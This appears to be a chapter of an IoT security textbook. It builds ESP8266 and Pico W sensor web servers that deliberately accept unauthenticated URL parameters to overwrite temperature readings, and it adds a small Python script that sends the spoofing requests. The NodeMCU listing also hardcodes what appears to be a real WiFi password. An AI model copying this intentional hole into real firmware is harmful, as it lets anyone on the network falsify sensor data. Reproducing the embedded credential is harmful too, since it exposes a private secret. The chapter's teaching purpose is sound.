% ==========================================
% CHAPTER 04: Level 6 Injection
% ==========================================
\chapter{Level 6: The Unsecured Injection Attack}

\textbf{In This Chapter:}
\begin{itemize}
    \item Systematically demonstrating architectural injection vulnerabilities.
    \item Code execution of `Level\_6\_IoT\_Insecurity\_Demo` and `03\_unsecured\_web.py`.
    \item Reviewing the interactive Attacker script execution methodologies.
\end{itemize}

What defines an insecure system? It is a mechanism that inherently trusts user input blindly. We will build a system designed to read temperature. However, we will install a common developer "debug" flaw: the server will arbitrarily listen for URL Query Parameters (\texttt{?t=} and \texttt{?h=}). 

If an external agent manipulates the URL, the algorithm will instantly discard the real sensor telemetry and permanently replace it with the hacker's numbers. And it requires no password.

\section{Systematic NodeMCU Implementation (Level 6)}
Below lies the unabridged C++ execution mapped directly from the `23022026\_Level\_6\_IoT\_Insecurity\_Demo\_With\_Description.ino` file.

\begin{lstlisting}[language=C++, caption=23022026\_Level\_6\_IoT\_Insecurity\_Demo\_With\_Description.ino]
/*
  IoT Insecurity Demo
  -------------------
  Board: NodeMCU (ESP8266)
  Sensor: DHT22
  
  PURPOSE:
  1. Show real temperature and humidity by default.
  2. Allow anyone on same WiFi to override values using URL.
  3. Fake values remain until device is rebooted.
  
  HOW TO HACK:
  Browser:
    http://YOUR_IP/?t=100&h=5
  
  CMD (Windows):
    curl "http://YOUR_IP/?t=80&h=10"
*/

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DHT.h>

#define D5PIN D5
#define DHTTYPE DHT22

// ---------------- WIFI DETAILS ----------------
const char* ssid = "drarka.in";            // Your WiFi Name
const char* pass = "arkaprabha@1985";      // Your WiFi Password

// ---------------- OBJECTS ----------------
DHT dht(D5PIN, DHTTYPE);
ESP8266WebServer server(80);

// ---------------- OVERRIDE STORAGE ----------------
// If these stay NAN → real sensor data is shown
// If changed → fake values will be shown
float overrideTemp = NAN;
float overrideHum  = NAN;

void setup() {

  Serial.begin(9600);       // Start Serial Monitor
  dht.begin();              // Start DHT sensor

  WiFi.begin(ssid, pass);   // Connect to WiFi
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
  }

  Serial.println("Connected!");
  Serial.print("Open this IP in browser: ");
  Serial.println(WiFi.localIP());

  // ------------- WEB SERVER HANDLER -------------
  server.on("/", []() {

    // If URL contains ?t= or ?h= → store override permanently
    if (server.hasArg("t")) overrideTemp = server.arg("t").toFloat();
    if (server.hasArg("h")) overrideHum  = server.arg("h").toFloat();

    // Read real sensor values
    float t = dht.readTemperature();
    float h = dht.readHumidity();

    // If override exists → replace real data
    if (!isnan(overrideTemp)) t = overrideTemp;
    if (!isnan(overrideHum))  h = overrideHum;

    // -------- HTML PAGE --------
    String page = "<html>";
    page += "<head><meta http-equiv='refresh' content='5'></head>";
    page += "<body bgcolor='black' text='white'><center>";

    page += "<h1>Temperature</h1>";
    page += "<h1><font color='cyan'>" + String(t) + " C</font></h1>";

    page += "<h1>Humidity</h1>";
    page += "<h1><font color='pink'>" + String(h) + " %</font></h1>";

    page += "</center></body></html>";

    server.send(200, "text/html", page);
  });

  server.begin();  // Start server
}

void loop() {
  server.handleClient();  // Keep server running
}
\end{lstlisting}


\section{Systematic Pico W Implementation (Level 3 Unsecured)}

Because native MicroPython handles bare network execution via pure TCP arrays, the vulnerability requires aggressive string parsing at scale. Notice the manual list index iteration surrounding line `78`.

\begin{lstlisting}[language=Python, caption=03\_unsecured\_web.py]
import network
import socket
import time
import machine
import dht
import secrets

# -------------------------
# Sensor Setup
# -------------------------
sensor = dht.DHT22(machine.Pin(15))

# -------------------------
# WiFi Connection
# -------------------------
wlan = network.WLAN(network.STA_IF)
wlan.active(True)
wlan.connect(secrets.SSID, secrets.PASSWORD)

print("Connecting to WiFi...")

while not wlan.isconnected():
    time.sleep(1)

print("Connected!")
print("IP Address:", wlan.ifconfig()[0])

# -------------------------
# Socket Server Setup
# -------------------------
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 80))
s.listen(5)
s.settimeout(1)   # ⭐ IMPORTANT → Prevents freezing

# -------------------------
# Variables
# -------------------------
spoof_active = False
t, h = "0.0", "0.0"

# -------------------------
# Main Loop
# -------------------------
try:
    while True:

        # Read real sensor if not spoofing
        if not spoof_active:
            try:
                sensor.measure()
                t = "{:.1f}".format(sensor.temperature())
                h = "{:.1f}".format(sensor.humidity())
            except:
                pass

        # Wait for connection (non-blocking)
        try:
            conn, addr = s.accept()
        except OSError:
            time.sleep(0.1)
            continue

        try:
            raw_req = conn.recv(1024)
            if not raw_req:
                conn.close()
                continue

            request = raw_req.decode()

            # -------------------------
            # Spoof Request
            # -------------------------
            if '/set_env?' in request:
                try:
                    query = request.split('?')[1].split(' ')[0]
                    for p in query.split('&'):
                        if p.startswith('t='):
                            t = p.split('=')[1]
                        if p.startswith('h='):
                            h = p.split('=')[1]
                    spoof_active = True
                except:
                    pass

            # -------------------------
            # Reset Request
            # -------------------------
            if '/reset' in request:
                spoof_active = False

            # -------------------------
            # HTML Page
            # -------------------------
            html = f"""<!DOCTYPE html>
<html>
<head>
<title>Remote Monitor</title>
<meta http-equiv="refresh" content="2">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {{
    background-color: #121212;
    font-family: sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}}
.card {{
    background-color: #1e1e1e;
    padding: 2rem;
    border-radius: 1rem;
    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
    text-align: center;
    width: 300px;
}}
.temp {{
    color: cyan;
    font-size: 2.5rem;
    font-weight: bold;
}}
.hum {{
    color: pink;
    font-size: 2.5rem;
    font-weight: bold;
}}
.label {{
    color: #888;
    font-size: 0.8rem;
    text-transform: uppercase;
    letter-spacing: 1px;
}}
.status {{
    margin-top: 1rem;
    color: orange;
    font-size: 0.9rem;
}}
button {{
    margin-top: 1rem;
    padding: 8px 15px;
    border: none;
    border-radius: 6px;
    background: #333;
    color: white;
}}
</style>
</head>
<body>
<div class="card">
    <div class="label">Temperature</div>
    <div class="temp">{t} &deg;C</div>
    <div class="label">Humidity</div>
    <div class="hum">{h} %</div>
    <div class="status">
        {"SPOOF MODE ACTIVE" if spoof_active else "LIVE SENSOR DATA"}
    </div>
    <a href="/reset"><button>Reset to Live</button></a>
</div>
</body>
</html>"""

            # Send response
            conn.send('HTTP/1.0 200 OK\r\nContent-type: text/html\r\n\r\n')
            conn.sendall(html)
            conn.close()

        except Exception as e:
            conn.close()

        time.sleep(0.1)

# -------------------------
# Clean Exit
# -------------------------
except KeyboardInterrupt:
    print("Server Stopped by User")
    s.close()
\end{lstlisting}

\section{The Exploitation Mechanism (Python Hacker Script)}

The following unabridged code represents the `03\_attack.py` Interactive Python Script. This is designed to be executed strictly from the Attacker's computer on the Local Area Network using native execution (`python 03\_attack.py`).

\begin{lstlisting}[language=Python, caption=03\_attack.py]
# Simple Interactive Exploit Tool (Educational Demo Only)

import urllib.request

print("=== PICO VULNERABILITY DEMO TOOL ===")
print("------------------------------------")

# 1. Ask Target IP
ip = input("Enter Pico IP address: ").strip()

# 2. Ask Mode
print("\nSelect Mode:")
print("1. Spoof Data")
print("2. Reset System")

choice = input("Enter choice (1 or 2): ").strip()

# 3. SPOOF MODE
if choice == "1":
    temp = input("Enter fake Temperature: ").strip()
    hum = input("Enter fake Humidity: ").strip()
    
    url = f"http://{ip}/set_env?t={temp}&h={hum}"
    print("\n[*] Sending spoofed data...")

# 4. RESET MODE
elif choice == "2":
    url = f"http://{ip}/reset"
    print("\n[*] Sending reset command...")

else:
    print("Invalid choice!")
    exit()

# 5. Send Request
try:
    urllib.request.urlopen(url, timeout=5)
    print("[+] Attack Sent Successfully!")
    print("[+] Check Pico dashboard now.")
except Exception as e:
    print("[-] Failed:", e)
\end{lstlisting}

\begin{takeawaybox}
This interactive terminal script completely nullifies the physical existence of the IoT sensor array without demanding a single credential. The ease of execution using generic Python libraries (like \texttt{urllib} or \texttt{requests}) highlights the fundamental flaw in prioritizing immediate functionality over rigorous authentication checks.
\end{takeawaybox}
